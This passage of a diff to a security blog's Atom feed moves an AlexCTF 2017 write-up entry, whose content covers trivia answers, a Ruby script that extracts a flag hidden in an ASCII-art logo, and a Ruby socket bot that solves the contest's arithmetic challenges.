class="line">+@@@@@@@@      ;@@@@@.   @,@    ;@       @         ,@ @,   ;@     `    `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.   @ @:   ;@       @          @`@    ;@          `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.   @ .@   ;@       @          ,@:    ;@          `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.  +#  @   ;@       @@@@@@      @     ;@          `@     @@@@@@   ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.  @   @`  ;@       @          @+@    ;@          `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.  @   &apos;#  ;@       @          @ @    ;@          `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@. ,@@@@@@  ;@       @         @; :@   ;@     @    `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@. @:    @  ;@       @         @   @   ,@     @    `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@. @     @; ;@       @        @;   :@   @,   @&apos;    `@     @        ;@@@@@.   </div><div class="line">+@@@@@L@@      ;@@@@@. @     .@ ;@@@@@@  @@@@@@@  @     @    @@@@#     `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@0@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@G@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.             ..,:,..                                             ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.    `&apos;@@@@@@@@@@@@@@@@@@@@:                                      ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.+@@@@@@@@@@@@@0@@@@@@@@@@@@@@@.                                  ;@@@_@.   </div><div class="line">+@@R@@@@@      ;@@@@0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#                                ;@@C@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@`                            .@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@@@@@@K@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,                    `&apos;@@@@@S@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@@@@@@@@@@@@@+;;...;;+@@@@@@@@@@@@@@@@@@@@@@+:.    ..:+@@@@@@@@@@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@@@@@#,                    &apos;@@@@@&#125;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@;                            ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@#                                  `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#      </div><div class="line">+@@@@@@@@      ,                                        ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.         </div><div class="line">+@@@@@@@@                                                  `+@@@@@@@@@@@@@@@@@@@@#,              </div><div class="line">+@@@@@@@@                                                         .;&apos;+++&apos;;.                      </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+++++++++++++++++++#@@@@@@@@+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@</div></pre></td></tr></table></figure></p>
-<p>Let's write a very short ruby script to filter that:</p>
-<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line">logo = open(<span class="string">"logo.txt"</span>, <span class="string">'r'</span>).read()</div><div class="line"><span class="comment">#flag = logo.gsub(/[^a-zA-Z0-9&#123;&#125;_]/, '')</span></div><div class="line">flag = logo.gsub(<span class="regexp">/[#@.;:+,`'\s]/</span>, <span class="string">''</span>)</div><div class="line">puts flag</div></pre></td></tr></table></figure></p>
-<p>Flag: <code>ALEXCTF{0UR_L0G0_R0CKS}</code></p>
-<h2 id="100-sc1-math-bot-scripting">100 - SC1: Math bot - Scripting</h2>
-<blockquote>
-<p>It is well known that computers can do tedious math faster than human.</p>
-<p>nc 195.154.53.62 1337</p>
-<p>Update</p>
-<p>we got another mirror here</p>
-<p>nc 195.154.53.62 7331</p>
-</blockquote>
-<p>The server send some calculations with big integers and we have to solve a lot of them.</p>
-<p>To do that I did a ruby bot:</p>
-<p><figure class="highlight ruby"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div></pre></td><td class="code"><pre><div class="line"><span class="comment">#!/usr/bin/ruby</span></div><div class="line"><span class="keyword">require</span> <span class="string">'socket'</span></div><div class="line"></div><div class="line">hostname = <span class="string">'195.154.53.62'</span></div><div class="line">port = <span class="number">1337</span></div><div class="line"></div><div class="line">s = TCPSocket.open(hostname, port)</div><div class="line"></div><div class="line">raw = <span class="string">''</span></div><div class="line">res = <span class="literal">nil</span></div><div class="line">flag = <span class="literal">false</span></div><div class="line"></div><div class="line"><span class="keyword">while</span> line = s.gets   <span class="comment"># Read lines from the socket</span></div><div class="line">    puts line.chop    <span class="comment"># And print with platform line terminator</span></div><div class="line">    raw += line</div><div class="line">    <span class="keyword">if</span> raw.match(<span class="regexp">/=$/</span>) &amp;&amp; flag == <span class="literal">false</span></div><div class="line">        calc = raw.match(<span class="regexp">/^([0-9]*) ([+\-%*\/]) ([0-9]*) =/</span>)</div><div class="line">        a = calc.captures[<span class="number">0</span>].to_i</div><div class="line">        oper = calc.captures[<span class="number">1</span>]</div><div class="line">        b = calc.captures[<span class="number">2</span>].to_i</div><div class="line">        <span class="keyword">if</span> oper == <span class="string">'+'</span></div><div class="line">            res = a + b</div><div class="line">        <span class="keyword">elsif</span> oper == <span class="string">'-'</span></div><div class="line">            res = a - b</div><div class="line">        <span class="keyword">elsif</span> oper == <span class="string">'*'</span></div><div class="line">            res = a * b</div><div class="line">        <span class="keyword">elsif</span> oper == <span class="string">'%'</span></div><div class="line">            res = a % b</div><div class="line">        <span class="keyword">elsif</span> oper == <span class="string">'/'</span></div><div class="line">            res = a / b</div><div class="line">        <span class="keyword">else</span></div><div class="line">            puts <span class="string">"That's not good..."</span></div><div class="line">        <span class="keyword">end</span></div><div class="line">        <span class="keyword">if</span> res != <span class="literal">nil</span></div><div class="line">            puts res</div><div class="line">            s.puts res</div><div class="line">        <span class="keyword">end</span></div><div class="line">        res = <span class="literal">nil</span></div><div class="line">        raw = <span class="string">''</span></div><div class="line">    <span class="keyword">end</span></div><div class="line"><span class="keyword">end</span></div><div class="line">s.close               <span class="comment"># Close the socket when done</span></div></pre></td></tr></table></figure></p>
-<p><em>Note</em>: I chose not to use some exec function because I don't trust external entries.</p>
-<p>Here an example of output and the flag:</p>
-<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div></pre></td><td class="code"><pre><div class="line">                __________</div><div class="line">         ______/ ________ \______</div><div class="line">       _/      ____________      \_</div><div class="line">     _/____________    ____________\_</div><div class="line">    /  ___________ \  / ___________  \</div><div class="line">   /  /XXXXXXXXXXX\ \/ /XXXXXXXXXXX\  \</div><div class="line">  /  /############/    \############\  \</div><div class="line">  |  \XXXXXXXXXXX/ _  _ \XXXXXXXXXXX/  |</div><div class="line">__|\_____   ___   //  \\   ___   _____/|__</div><div class="line">[_       \     \  X    X  /     /       _]</div><div class="line">__|     \ \                    / /     |__</div><div class="line">[____  \ \ \   ____________   / / /  ____]</div><div class="line">     \  \ \ \/||.||.||.||.||\/ / /  /</div><div class="line">      \_ \ \  ||.||.||.||.||  / / _/</div><div class="line">        \ \   ||.||.||.||.||   / /</div><div class="line">         \_   ||_||_||_||_||   _/</div><div class="line">           \     ........     /</div><div class="line">            \________________/</div><div class="line"></div><div class="line">Our system system has detected human traffic from your IP!</div><div class="line">Please prove you are a bot</div><div class="line">Question  1 :</div><div class="line">188284398378183198274310077338361 - 222311858895894501436877647952618 =</div><div class="line"></div><div class="line">[...]</div><div class="line"></div><div class="line">Question  250 :</div><div class="line">198932319558549559940672382195244 % 276981013309967153730940955239195 =</div><div class="line">Well no human got time to solve 500 ridiculous math challenges</div><div class="line">Congrats MR bot!</div><div class="line">Tell your human operator flag is: ALEXCTF&#123;1_4M_l33t_b0t&#125;</div></pre></td></tr></table></figure></p>
-]]></content>
-    
-    <summary type="html">
-    
-      &lt;h2 id=&quot;informations&quot;&gt;Informations&lt;/h2&gt;
-&lt;h3 id=&quot;version&quot;&gt;Version&lt;/h3&gt;
-&lt;table&gt;
-&lt;thead&gt;
-&lt;tr&gt;
-&lt;th&gt;By&lt;/th&gt;
-&lt;th&gt;Version&lt;/th&gt;
-&lt;th&gt;Comment&lt;/th&gt;
-&lt;/t
-    
-    </summary>
-    
-      <category term="security" scheme="https://rawsec.ml/categories/security/"/>
-    
-      <category term="writeups" scheme="https://rawsec.ml/categories/security/writeups/"/>
-    
-    
-      <category term="security" scheme="https://rawsec.ml/tags/security/"/>
-    
-      <category term="writeups" scheme="https://rawsec.ml/tags/writeups/"/>
-    
-      <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
-    
-  </entry>
-  
-  <entry>
     <title>BITSCTF 2017 - Write-ups</title>
     <link href="https://rawsec.ml/en/BITSCTF-2017-writeups/"/>
     <id>https://rawsec.ml/en/BITSCTF-2017-writeups/</id>
@@ -1285,6 +1549,104 @@ Download file here:</p>
       <category term="ctf" scheme="https://rawsec.ml/tags/ctf/"/>
     
       <category term="misc" scheme="https://rawsec.ml/tags/misc/"/>
+    
+  </entry>
+  
+  <entry>
+    <title>AlexCTF 2017 - Write-ups</title>
+    <link href="https://rawsec.ml/en/AlexCTF-2017-write-ups/"/>
+    <id>https://rawsec.ml/en/AlexCTF-2017-write-ups/</id>
+    <published>2017-02-04T23:00:00.000Z</published>
+    <updated>2017-02-07T21:03:11.491Z</updated>
+    
+    <content type="html"><![CDATA[<h2 id="informations">Informations</h2>
+<h3 id="version">Version</h3>
+<table>
+<thead>
+<tr>
+<th>By</th>
+<th>Version</th>
+<th>Comment</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td>noraj</td>
+<td>1.0</td>
+<td>Creation</td>
+</tr>
+</tbody>
+</table>
+<h3 id="ctf">CTF</h3>
+<ul>
+<li><strong>Name</strong> : AlexCTF 2017</li>
+<li><strong>Website</strong> : <a href="https://ctf.oddcoder.com/" target="_blank" rel="external">ctf.oddcoder.com</a></li>
+<li><strong>Type</strong> : Online</li>
+<li><strong>Format</strong> : Jeopardy</li>
+<li><strong>CTF Time</strong> : <a href="https://ctftime.org/event/408/" target="_blank" rel="external">link</a></li>
+</ul>
+<h2 id="10-tr1-hello-there-trivia">10 - TR1: Hello there - Trivia</h2>
+<blockquote>
+<p>Why not drop us a few lines and say hi :).</p>
+</blockquote>
+<p>Go to the irc: <code>#alexctf @freenode</code> and get the flag with <code>/topic</code>.</p>
+<h2 id="20-tr2-ssl-0day-trivia">20 - TR2: SSL 0day - Trivia</h2>
+<blockquote>
+<p>It lead to memory leakage between servers and clients rending large number of private keys accessible. (one word)</p>
+</blockquote>
+<p>Answer: <strong>heartbleed</strong> (<a href="http://heartbleed.com/" target="_blank" rel="external">details</a>)</p>
+<h2 id="30-tr3-ca-trivia">30 - TR3: CA - Trivia</h2>
+<blockquote>
+<p>What is the CA that issued Alexctf https certificate</p>
+<p>(flag is lowercase with no spaces)</p>
+</blockquote>
+<p>Answer: <strong>letsencrypt</strong></p>
+<h2 id="40-tr4-doesn-t-our-logo-look-cool-trivia">40 - TR4: Doesn't our logo look cool ? - Trivia</h2>
+<p>Here is the logo:</p>
+<p><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div><div class="line">36</div><div class="line">37</div><div class="line">38</div><div class="line">39</div><div class="line">40</div><div class="line">41</div><div class="line">42</div><div class="line">43</div><div class="line">44</div><div class="line">45</div><div class="line">46</div><div class="line">47</div><div class="line">48</div><div class="line">49</div><div class="line">50</div><div class="line">51</div><div class="line">52</div><div class="line">53</div><div class="line">54</div><div class="line">55</div><div class="line">56</div><div class="line">57</div><div class="line">58</div><div class="line">59</div><div class="line">60</div><div class="line">61</div><div class="line">62</div><div class="line">63</div><div class="line">64</div><div class="line">65</div><div class="line">66</div><div class="line">67</div><div class="line">68</div><div class="line">69</div><div class="line">70</div><div class="line">71</div><div class="line">72</div><div class="line">73</div><div class="line">74</div><div class="line">75</div><div class="line">76</div><div class="line">77</div><div class="line">78</div><div class="line">79</div><div class="line">80</div><div class="line">81</div><div class="line">82</div><div class="line">83</div><div class="line">84</div><div class="line">85</div><div class="line">86</div><div class="line">87</div><div class="line">88</div><div class="line">89</div><div class="line">90</div><div class="line">91</div><div class="line">92</div><div class="line">93</div><div class="line">94</div><div class="line">95</div><div class="line">96</div><div class="line">97</div><div class="line">98</div><div class="line">99</div><div class="line">100</div><div class="line">101</div><div class="line">102</div><div class="line">103</div><div class="line">104</div><div class="line">105</div><div class="line">106</div><div class="line">107</div><div class="line">108</div><div class="line">109</div><div class="line">110</div><div class="line">111</div><div class="line">112</div><div class="line">113</div><div class="line">114</div><div class="line">115</div></pre></td><td class="code"><pre><div class="line"></div><div class="line"></div><div class="line"></div><div class="line">&apos;@+.                                                                                          </div><div class="line">@@@@@@@:                                                                                        </div><div class="line">@@@@@@@@@#                                                                                       </div><div class="line">@@@@@@@@@@@,                                                                                      </div><div class="line">&apos;@@@@@@@@@@@@                                                                                      </div><div class="line">@@@@@@@@@@@@@                                                                                      </div><div class="line">@@@@@@@@@@@@@.                                                                                     </div><div class="line">@@@@@@@@@@@@@,                                                                                     </div><div class="line">@@@@A@@@@@@@@                                                                                      </div><div class="line">+@@@@@@@@@@@@                       .:++@@@@@+:.                                                   </div><div class="line">@@@@@@@@@@@&apos;                .+@@@@@@@@@@@@@@@@@@@@@`                                              </div><div class="line">.@@@@@@@@@@            .#@@@@@@@@@@@@@@L@@@@@@@@@@@@@#                                            </div><div class="line">+@@@@@@@@         `#@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@                                   .@@.   </div><div class="line">+@@@E@@@@      .@@@@@@X@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@:                              &apos;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@C@@.                       `+@@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@T@@@@@@@@@@@&apos;,`       .+@@@@@@@@@@@@@@@:              `:@@@@@@F@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@@@@@@+.                    ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@@,                           `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                               +@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                   ;@@@@@@@@@@@@&#123;@@@@@@@@@@@#,   ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                       &apos;@@@@@@@@@@@@@@+,         ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                        :;.                      ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.    @     ;@       @@@@@@@  @`   `@   +@@#@@  &apos;@@@@@@@  @@@@@@@, ;@@@0@.   </div><div class="line">+@@@@U@@@      ;@@@@@.    @+    ;@       @        .@   @,   @    #@    `@     @        ;@@@@@.   </div><div class="line">+@@@@@R@@      ;@@@@@.   .@@    ;@       @         @` `@   :@     @    `@     @        ;@@@_@.   </div><div class="line">+@@@@@@@@      ;@@@@@.   @,@    ;@       @         ,@ @,   ;@     `    `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.   @ @:   ;@       @          @`@    ;@          `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.   @ .@   ;@       @          ,@:    ;@          `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.  +#  @   ;@       @@@@@@      @     ;@          `@     @@@@@@   ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.  @   @`  ;@       @          @+@    ;@          `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.  @   &apos;#  ;@       @          @ @    ;@          `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@. ,@@@@@@  ;@       @         @; :@   ;@     @    `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@. @:    @  ;@       @         @   @   ,@     @    `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@. @     @; ;@       @        @;   :@   @,   @&apos;    `@     @        ;@@@@@.   </div><div class="line">+@@@@@L@@      ;@@@@@. @     .@ ;@@@@@@  @@@@@@@  @     @    @@@@#     `@     @        ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@0@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@G@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.                                                                 ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.             ..,:,..                                             ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.    `&apos;@@@@@@@@@@@@@@@@@@@@:                                      ;@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@.+@@@@@@@@@@@@@0@@@@@@@@@@@@@@@.                                  ;@@@_@.   </div><div class="line">+@@R@@@@@      ;@@@@0@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#                                ;@@C@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@`                            .@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@@@@@@K@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@,                    `&apos;@@@@@S@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@@@@@@@@@@@@@+;;...;;+@@@@@@@@@@@@@@@@@@@@@@+:.    ..:+@@@@@@@@@@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@@@@@#,                    &apos;@@@@@&#125;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@@@@@;                            ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.   </div><div class="line">+@@@@@@@@      ;@@#                                  `@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#      </div><div class="line">+@@@@@@@@      ,                                        ;@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@.         </div><div class="line">+@@@@@@@@                                                  `+@@@@@@@@@@@@@@@@@@@@#,              </div><div class="line">+@@@@@@@@                                                         .;&apos;+++&apos;;.                      </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+@@@@@@@@                                                                                        </div><div class="line">+++++++++++++++++++#@@@@@@@@+++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++++               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div class="line">@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@               </div><div 